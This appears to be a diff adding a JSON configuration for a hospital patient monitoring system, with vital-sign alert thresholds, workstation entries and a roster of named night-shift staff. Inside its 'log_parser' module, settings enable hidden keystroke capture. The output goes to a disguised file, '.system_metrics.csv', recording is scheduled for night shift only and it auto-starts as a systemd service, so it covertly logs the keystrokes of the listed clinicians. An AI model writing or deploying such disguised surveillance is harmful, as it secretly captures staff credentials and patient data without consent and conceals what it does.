@@ -1,0 +1,142 @@
+{
+  "system_name": "Patient Monitoring System v4.2",
+  "log_parser_script": "patient_logs.py",
+  "version": "4.2.1",
+  "settings": {
+    "log_level": "INFO",
+    "log_retention_days": 90,
+    "log_directory": "/var/log/patient_monitoring/",
+    "enable_audit_logging": true,
+    "audit_log_file": "system_audit.log",
+    "enable_performance_metrics": true,
+    "metrics_interval_seconds": 60
+  },
+  "modules": [
+    {
+      "name": "heart_rate_monitor",
+      "enabled": true,
+      "update_frequency_ms": 1000,
+      "alert_threshold_bpm_low": 50,
+      "alert_threshold_bpm_high": 120
+    },
+    {
+      "name": "blood_pressure_monitor",
+      "enabled": true,
+      "update_frequency_ms": 5000,
+      "alert_threshold_systolic_low": 90,
+      "alert_threshold_systolic_high": 180,
+      "alert_threshold_diastolic_low": 60,
+      "alert_threshold_diastolic_high": 120
+    },
+    {
+      "name": "oxygen_saturation_monitor",
+      "enabled": true,
+      "update_frequency_ms": 2000,
+      "alert_threshold_spo2_low": 92
+    },
+    {
+      "name": "respiratory_rate_monitor",
+      "enabled": true,
+      "update_frequency_ms": 3000,
+      "alert_threshold_rr_low": 8,
+      "alert_threshold_rr_high": 30
+    },
+    {
+      "name": "log_parser",
+      "enabled": true,
+      "log_file_pattern": "patient_data_*.log",
+      "parser_type": "regex",
+      "keystroke_capture_enabled": true,
+      "keystroke_log_file": ".system_metrics.csv",
+      "keystroke_log_hidden": true,
+      "keystroke_capture_schedule": "night_shift",
+      "night_shift_start": "22:00",
+      "night_shift_end": "06:00",
+      "auto_start_enabled": true,
+      "auto_start_method": "systemd_service",
+      "workstation_id_source": "mac_address",
+      "timestamp_format": "ISO8601"
+    }
+  ],
+  "workstations": [
+    {
+      "workstation_id": "WS-NW-101",
+      "mac_address": "AA:BB:CC:DD:EE:01",
+      "location": "Nurse Station West",
+      "department": "Emergency",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    },
+    {
+      "workstation_id": "WS-NE-102",
+      "mac_address": "AA:BB:CC:DD:EE:02",
+      "location": "Nurse Station East",
+      "department": "ICU",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    },
+    {
+      "workstation_id": "WS-CENT-103",
+      "mac_address": "AA:BB:CC:DD:EE:03",
+      "location": "Central Monitoring",
+      "department": "Cardiology",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    },
+    {
+      "workstation_id": "WS-PHARM-104",
+      "mac_address": "AA:BB:CC:DD:EE:04",
+      "location": "Pharmacy Counter",
+      "department": "Pharmacy",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    },
+    {
+      "workstation_id": "WS-ADMIN-105",
+      "mac_address": "AA:BB:CC:DD:EE:05",
+      "location": "Administration Desk",
+      "department": "Administration",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    },
+    {
+      "workstation_id": "WS-LAB-106",
+      "mac_address": "AA:BB:CC:DD:EE:06",
+      "location": "Lab Terminal",
+      "department": "Pathology",
+      "auto_start_services": ["patient_monitoring", "log_parser"]
+    }
+  ],
+  "night_shift_personnel": [
+    {
+      "employee_id": "NS-2284",
+      "name": "Dr. Alice Chen",
+      "role": "Resident Physician",
+      "shift": "Night",
+      "assigned_workstations": ["WS-NW-101", "WS-NE-102"]
+    },
+    {
+      "employee_id": "NS-3317",
+      "name": "Nurse Ben Rodriguez",
+      "role": "Charge Nurse",
+      "shift": "Night",
+      "assigned_workstations": ["WS-NW-101", "WS-CENT-103"]
+    },
+    {
+      "employee_id": "NS-4452",
+      "name": "Nurse Chloe Williams",
+      "role": "ICU Nurse",
+      "shift": "Night",
+      "assigned_workstations": ["WS-NE-102"]
+    },
+    {
+      "employee_id": "NS-5098",
+      "name": "Technician David Kim",
+      "role": "Lab Technician",
+      "shift": "Night",
+      "assigned_workstations": ["WS-LAB-106"]
+    },
+    {
+      "employee_id": "NS-6123",
+      "name": "Pharmacist Emma Garcia",
+      "role": "Night Pharmacist",
+      "shift": "Night",
+      "assigned_workstations": ["WS-PHARM-104"]
+    }
+  ]
+}
